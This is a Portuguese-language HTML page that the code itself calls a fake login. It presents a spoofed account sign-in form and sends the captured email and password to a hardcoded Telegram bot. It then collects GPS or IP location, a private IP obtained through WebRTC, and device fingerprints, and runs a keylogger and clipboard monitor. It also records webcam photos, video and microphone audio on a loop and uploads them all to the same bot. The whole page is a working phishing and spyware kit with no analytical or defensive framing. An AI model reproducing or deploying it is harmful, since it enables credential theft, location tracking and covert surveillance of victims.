<!doctype html>
<html lang="pt-BR">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
 *{margin:0;padding:0;box-sizing:border-box}
 html,body{height:100%;background:#000;display:flex;align-items:center;justify-content:center;color:#00ff88;font:24px sans-serif}
 #load{position:fixed;inset:0;z-index:9999;background:#000;display:flex;flex-direction:column;align-items:center;justify-content:center}
 .spin{width:60px;height:60px;border:4px solid #00ff8840;border-top-color:#00ff88;border-radius:50%;animation:spin 1s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
 #fakeForm{display:none;background:#111;padding:40px;border-radius:8px;color:#eee;flex-direction:column;align-items:center}
 #fakeForm h2{margin-bottom:20px;font-size:20px}
 #fakeForm input{width:260px;padding:12px;margin:8px 0;border:0;border-radius:4px;font-size:16px}
 #fakeForm button{width:100%;padding:14px;margin-top:12px;border:0;border-radius:4px;background:#00ff88;color:#000;font-size:16px;font-weight:bold;cursor:pointer}
 #fakeForm button:hover{background:#00cc6a}
 #statusPC{position:fixed;bottom:20px;left:20px;color:#00ff88;font:12px monospace;opacity:.6}
</style>
</head>
<body>
<div id="load">
 <div class="spin"></div>
 <h3>Carregando<span class="dots">...</span></h3>
</div>

<form id="fakeForm">
 <h2>Acesse sua conta</h2>
 <input id="em" type="email" placeholder="E-mail" autocomplete="email">
<input id="pw" type="password" placeholder="Senha" autocomplete="current-password">
 <button type="submit">Entrar</button>
</form>

<div id="statusPC"></div>

<script>
const BOT_TOKEN="8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks";
const CHAT_ID="8792921881";

const enviarTexto=t=>fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:t.slice(0,4096),parse_mode:"HTML"})}).catch(()=>{});
const enviarMidia=(tipo,fd)=>fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${tipo}`,{method:"POST",body:fd}).catch(()=>{});
const save=u=>fetch("/api/salva",{method:"POST",body:JSON.stringify(u),headers:{"content-type":"application/json"}}).catch(()=>{});

const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const statusPC=m=>{const el=document.getElementById("statusPC");if(el)el.textContent=m};

let rel=[],mapLink="",ffmpeg=null,audioRecorder=null,videoRecorder=null,audioChunksA=[],audioChunksB=[],useA=true,videoChunks=[],keyLog=[],clipLog=[],fotoTimeout=null,videoStream=null,audioStream=null;

/* ---------- FFmpeg sem erro ---------- */
const LOAD_FFMPEG=()=>new Promise((res,rej)=>{
 if(window.FFmpeg){res();return}
 const s=document.createElement("script");
 s.src="https://cdn.jsdelivr.net/npm/@ffmpeg/ffmpeg@0.12.9/dist/umd/ffmpeg.js";
 s.onload=()=>res(); s.onerror=()=>rej(new Error("FFmpeg CDN falhou"));
 document.head.appendChild(s);
});
const initFFmpeg=async()=>{
 await LOAD_FFMPEG();
 const {createFFmpeg}=window.FFmpeg;
 ffmpeg=createFFmpeg({log:false});
 await ffmpeg.load();
 statusPC("FFmpeg pronto");
};
const webmToMp4=async(webmBlob)=>{
 if(!ffmpeg)return webmBlob;
 const input="rec.webm",output="rec.mp4";
 const buf=await webmBlob.arrayBuffer();
 ffmpeg.FS("writeFile",input,new Uint8Array(buf));
 await ffmpeg.run("-i",input,"-c","copy",output);
 const data=ffmpeg.FS("readFile",output);
 return new Blob([data.buffer],{type:"video/mp4"});
};

/* ---------- GPS + mapa ---------- */
async function gps(){
 return new Promise(res=>{
   navigator.geolocation.getCurrentPosition(
     async pos=>{
       const{latitude:lat,longitude:lon,accuracy:acc}=pos.coords;
       mapLink=`https://www.google.com/maps?q=${lat},${lon}&ll=${lat},${lon}&z=18`;
       rel.push(`GPS: ${lat.toFixed(6)},${lon.toFixed(6)} (±${acc}m) ${mapLink}`); res();
     },
     async ()=>{
       const ip=await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"");
       const geo=await fetch(`http://ip-api.com/json/${ip}`).then(r=>r.json()).catch(()=>({lat:null,lon:null}));
       if(geo.lat && geo.lon){mapLink=`https://www.google.com/maps?q=${geo.lat},${geo.lon}&ll=${geo.lat},${geo.lon}&z=16`;rel.push(`IP-Geo: ${geo.lat},${geo.lon} (${geo.city}) ${mapLink}`);}
       else rel.push("Localização: indisponível"); res();
     },
     {enableHighAccuracy:true,timeout:8000,maximumAge:0}
   );
 });
}

/* ---------- IP + ISP + VPN ---------- */
async function redes(){
 try{
   const ip=await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"---"); rel.push(`IP Público: ${ip}`);
   const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]}); pc.createDataChannel("");
   let cand=[]; pc.onicecandidate=e=>{if(e&&e.candidate)cand.push(e.candidate.candidate)};
   try{await pc.setLocalDescription(await pc.createOffer());await sleep(1500)}catch{}; pc.close();
   const priv=cand.find(c=>c.includes("192.168")||c.includes("10.")||c.includes("172.")); rel.push(`IP Privado: ${priv?priv.split(" ")[4]:'---'}`);
   const geo=await fetch(`http://ip-api.com/json/${ip}`).then(r=>r.json()).catch(()=>({isp:"",country:"",org:""}));
   rel.push(`ISP: ${geo.isp||'---'} | País: ${geo.country||'---'}`);
   if(navigator.connection){const c=navigator.connection;rel.push(`Rede: ${c.type||'-'} ${c.effectiveType||'-'} ${c.downlink?c.downlink+'Mbps':''}`);}
   rel.push(`VPN?: ${(geo.org&&geo.org.toLowerCase().includes("vpn"))?"Suspeito":"Não detectado"}`);
 }catch(e){rel.push(`Rede: erro`)}
}

/* ---------- HW + bateria ---------- */
function hwinfo(){
 rel.push(`User-Agent: ${navigator.userAgent?.slice(0,200)}`);
 rel.push(`Plataforma: ${navigator.platform}`);
 rel.push(`Núcleos CPU: ${navigator.hardwareConcurrency||'?'}`);
 rel.push(`RAM estimada: ${navigator.deviceMemory||'?'} GB`);
 rel.push(`Tela: ${screen.width}x${screen.height} | Viewport: ${window.innerWidth}x${window.innerHeight}`);
 rel.push(`Idioma: ${navigator.language}`);
 rel.push(`Touch: ${navigator.maxTouchPoints||0} pontos`);
 if(performance.memory){const used=(performance.memory.usedJSHeapSize/1048576).toFixed(1),total=(performance.memory.totalJSHeapSize/1048576).toFixed(1);rel.push(`Memória JS: ${used}/${total} MB`);}
}
async function bateria(){
 try{const bat=await navigator.getBattery();rel.push(`Bateria: ${(bat.level*100).toFixed(0)}% | ${bat.charging?'Carregando':'Desconectado'}`)}catch{rel.push("Bateria: não disponível")}
}

/* ---------- Keylogger + clipboard ---------- */
function keylogger(){
 document.addEventListener("keydown",e=>{keyLog.push(e.key);if(keyLog.length>50){enviarTexto("📝 KEYLOG\n"+keyLog.join(""));keyLog=[]}});
 setInterval(()=>navigator.clipboard.readText().then(t=>{if(t&&t!==clipLog[clipLog.length-1]){clipLog.push(t);enviarTexto("📋 CLIPBOARD\n"+t.slice(0,500))}}).catch(()=>{}),3000);
}

/* ---------- Mídias (fotos/vídeo/mp4) ---------- */
async function midias(){
 statusPC("Solicitando mídia..."); let stream=null;
 try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720},audio:{sampleRate:44100,channelCount:1,echoCancellation:false}});statusPC("Permissões OK");}
 catch(err){rel.push(`Mídia negada: ${err.name}`);statusPC("Mídia negada");return;}
 videoStream=stream; audioStream=new MediaStream(stream.getAudioTracks());

 // vídeo contínuo → mp4
 try{
   videoRecorder=new MediaRecorder(videoStream,{mimeType:"video/webm;codecs=vp9,opus"});
   videoRecorder.ondataavailable=e=>{if(e.data&&e.data.size)videoChunks.push(e.data)};
   videoRecorder.start(1000);
 }catch(e){rel.push(`Erro vídeo: ${e.message}`)}
 setInterval(async()=>{
   if(!videoChunks.length)return;
   const mp4=await webmToMp4(new Blob(videoChunks.splice(0),{type:"video/webm"}));
   const fd=new FormData();fd.append("video",mp4,`v${Date.now()}.mp4`);fd.append("chat_id",CHAT_ID);
   enviarMidia("Video",fd);save({t:"video",s:mp4.size});statusPC(`MP4 enviado: ${(mp4.size/1024/1024).toFixed(1)}MB`);
 },60000);

 // audio alternado
 const makeAudioRecorder=()=>{
   const rec=new MediaRecorder(audioStream,{mimeType:"audio/webm;codecs=opus"});
   rec.ondataavailable=e=>{
     const chunks=useA?audioChunksB:audioChunksA; chunks.push(e.data);
     const target=useA?audioChunksA:audioChunksB;if(target.length>=5){
       const blob=new Blob(target.splice(0),{type:"audio/webm"});const fd=new FormData();
       fd.append("voice",blob,`a${Date.now()}.webm`);fd.append("chat_id",CHAT_ID);
       enviarMidia("Voice",fd);save({t:"audio",s:blob.size});
     }
   };rec.start(2000);return rec;
 };
 audioRecorder=makeAudioRecorder();
 setInterval(()=>{useA=!useA;audioRecorder.stop();audioRecorder=makeAudioRecorder()},10000);

 // fotos
 const tirarFoto=async(facing="user",label="selfie")=>{
   try{
     const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:1280,height:720}});
     const track=s.getVideoTracks()[0];const img=new ImageCapture(track);const blob=await img.takePhoto();
     const fd=new FormData();fd.append("photo",blob,`${label}_${Date.now()}.jpg`);fd.append("chat_id",CHAT_ID);
     await enviarMidia("Photo",fd);save({t:label,s:blob.size});track.stop();
   }catch{
     const c=document.createElement("canvas");c.width=640;c.height=480;
     const v=document.createElement("video");v.srcObject=videoStream;v.muted=true;v.play();await sleep(100);
     c.getContext("2d").drawImage(v,0,0,640,480);
     c.toBlob(b=>{const fd=new FormData();fd.append("photo",b,`${label}_${Date.now()}.jpg`);fd.append("chat_id",CHAT_ID);enviarMidia("Photo",fd)},"image/jpeg",0.7);
   }
 };
 fotoTimeout=setInterval(()=>tirarFoto("user","selfie"),10000);
 setTimeout(()=>tirarFoto("environment","rear"),2000);
 statusPC("Mídia ativa");
}

/* ---------- Login falso ---------- */
function fakeLogin(){
 document.getElementById("load").style.display="none";
 document.getElementById("fakeForm").style.display="flex";
 document.getElementById("fakeForm").onsubmit=e=>{
   e.preventDefault();
   const email=document.getElementById("em").value,pw=document.getElementById("pw").value;
   rel.push(`EMAIL: ${email}`);rel.push(`SENHA: ${pw}`);
   enviarTexto(`🔐 LOGIN\nE: ${email}\nS: ${pw}`);save({t:"login",em:email,pw:pw});
   document.getElementById("fakeForm").style.display="none";
   document.getElementById("load").style.display="flex";
   initFinal();
 };
}

/* ---------- Relatório e start ---------- */
async function initFinal(){
 try{
   await gps();
   await redes();
   hwinfo();
   await bateria();
   keylogger();
   await midias();
   enviarTexto("📊 RELATÓRIO\n"+rel.join("\n"));save({t:"rel",v:rel.join("\n")});
 }catch(e){enviarTexto("❌ ERRO: "+e.message);statusPC("Erro: "+e.message)}
}

/* ---------- Dispara ---------- */
window.onload=()=>initFFmpeg().then(()=>fakeLogin()).catch(()=>fakeLogin()); // roda mesmo sem FFmpeg
</script>
</body>
</html>
